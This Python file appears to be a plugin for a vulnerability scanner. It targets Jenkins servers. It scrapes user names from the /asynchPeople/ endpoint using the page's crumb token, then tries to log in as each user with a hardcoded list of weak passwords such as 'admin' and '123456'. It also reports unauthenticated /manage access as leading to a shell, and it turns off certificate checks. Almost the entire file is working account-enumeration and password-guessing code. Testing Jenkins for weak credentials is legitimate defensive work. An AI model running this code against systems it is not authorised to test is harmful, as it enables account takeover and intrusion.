__author__ = '10192989'
#-*-coding:utf-8-*-

import requests
import urllib.request, urllib.error, urllib.parse
import re
import json
from exp.lib.gla import getpassdict
import ssl
ssl._create_default_https_context = ssl._create_unverified_context

def get_user_list(url,timeout):
    user_list = []
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor())
    try:
        req = opener.open(url + "/asynchPeople/", timeout=timeout)
        res_html = req.read()
    except:
        return user_list

    m = re.search(b"makeStaplerProxy\('(.*?)','(.*?)'",res_html)
    if m:
        a = m.group(1).decode()
        user_url = url + a
        crumb = m.group(2).decode()
        request = urllib.request.Request(user_url+"/start",b"[]")
        set_request(request,crumb)
        try:
            opener.open(request, timeout=timeout)
        except:
            pass
        pp = 0
        while pp < 50:
            try:
                pp = pp + 1
                request = urllib.request.Request(user_url+"/news",b"[]")
                set_request(request,crumb)
                user_data = opener.open(request, timeout=timeout).read()
                if int(len(user_data)) >=20:
                    user_array = json.loads(user_data)
                    for _ in user_array["data"]:
                        user_list.append(_["id"])
                    if user_array["status"] == "done":break
                else:break
            except Exception as e:
                continue
    else:
        print('Cannot find userlist')
    if 'admin' in user_list:
        pass
    else:
        user_list.append('admin')
    if 'test' in user_list:
        pass
    else:
        user_list.append('test')
    return user_list

def set_request(request,crumb):
    request.add_header('Content-Type', 'application/x-stapler-method-invocation;charset=UTF-8')
    request.add_header('X-Requested-With', 'XMLHttpRequest')
    request.add_header('Crumb', crumb)

def crack(url,user_list,timeout):
    error_i = 0
    psw = ['admin','123456','test','anonymous','zte@123456']
    crackresult = []
    for user in user_list:
        for password in psw:
            try:
                login_url = url + '/j_acegi_security_check'
                PostStr = 'j_username=%s&j_password=%s' % (user, password)
                PostStr = PostStr.encode('UTF-8')
                request = urllib.request.Request(login_url, PostStr)
                res = urllib.request.urlopen(request, timeout=timeout)
                if res.code == 200 and "X-Jenkins" in res.headers:
                    passinfo = 'username: '+user+' has weakpass: '+password+' ;\n'
                    crackresult.append(passinfo)
                    print('Found a jenkins weak pass vul with username and password:'+user+' : ' + password +' .')
                    continue
            except urllib.error.HTTPError as e:
                continue
            except urllib.error.URLError as e:
                error_i += 1
                if error_i >= 3:
                    msg = 'There is no jenkins weak pass vul'
                    return False,msg
            except Exception as e:
                print(str(e))
                pass
    if len(crackresult) > 0 :
        msg = 'There is a jenkins weak pass vul which can result in get shell on url: ' + url + ' .The username and password info is:\n'+ ''.join(crackresult)
        return True, msg
    else:
        msg = 'There is no jenkins weak pass vul'
        return False,msg

def verify(protocol,ip,port):
    url = "%s://%s:%d" % (protocol,ip, int(port))
    print('testing if jenkins weak pass vul')
    timeout = 2
    try:
        res_html = urllib.request.urlopen(url,timeout=timeout).read()
    except urllib.error.HTTPError as e:
        try:
            res_html = e.read()
        except Exception:
            res_html = ''
    except Exception as e:
        res_html = ''
    testunlockurl = url + '/login'
    res = requests.get(testunlockurl,timeout=5,verify=False)
    if "Unlock Jenkins" in res.text and "To ensure Jenkins is securely set up by the administrator" in res.text:
        msg = 'There is no jenkins weak pass vul because of this page is locked'
        number = 'v0'
        return False, url, number, msg
    if b"/asynchPeople/" in res_html:
        if b'"/manage" class="task-link' in res_html:
            msg = 'There is a jenkins unauth vul which can result in get shell on %s' %url
            print(msg)
            number = 'v36'
            return True,url,number,msg
        user_list = get_user_list(url,timeout)
        (result,msg) = crack(url,user_list,timeout)
        if result == True:
            msg = msg
            print(msg)
            number = 'v36'
            return True,url,number,msg
        else:
            msg = msg
            number = 'v0'
            return False,url,number,msg

    elif b"anonymous" in res_html:
        user_list = ["admin","test"]
        (info,msg) = crack(url,user_list,timeout)
        if info == True:
            msg = msg
            print(msg)
            number = 'v36'
            return True,url,number,msg
        else:
            msg = msg
            number = 'v0'
            return False,url,number,msg
    msg = 'There is no jenkins weak pass vul'
    number = 'v0'
    return False,url,number,msg